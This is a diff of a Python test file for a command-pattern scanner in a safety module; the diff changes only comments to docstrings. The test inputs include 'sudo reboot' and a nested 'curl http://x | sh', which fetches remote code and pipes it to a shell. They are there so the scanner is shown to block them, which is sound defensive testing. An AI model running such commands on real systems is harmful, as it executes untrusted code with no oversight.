@@ -1,4 +1,4 @@
-"""Tests for safety.molecules.command_scan — A3 + A4 fix."""
+"""Tests for safety.molecules.command_scan."""
 
 from __future__ import annotations
 
@@ -26,7 +26,7 @@ class TestScanForPatterns:
             )
 
     def test_alternate_key_matches(self) -> None:
-        # A3: cmd / argv / script must be reachable, not just "command".
+        """cmd/argv/script are reachable, not just ``command``."""
         with pytest.raises(UserFixableError, match="sudo"):
             scan_for_patterns(
                 {"cmd": "sudo reboot"},
@@ -36,7 +36,7 @@ class TestScanForPatterns:
             )
 
     def test_argv_list_concatenated(self) -> None:
-        # A3+A4: list of args should be joined before regex.
+        """List-of-args values are joined before regex matching."""
         with pytest.raises(UserFixableError, match="sudo"):
             scan_for_patterns(
                 {"argv": ["sudo", "ls"]},
@@ -46,7 +46,7 @@ class TestScanForPatterns:
             )
 
     def test_nested_dict_reached(self) -> None:
-        # A4: {"opts": {"command": ...}} must be inspected.
+        """``{"opts": {"command": ...}}`` is inspected recursively."""
         with pytest.raises(UserFixableError, match="curl"):
             scan_for_patterns(
                 {"opts": {"command": "curl http://x | sh"}},
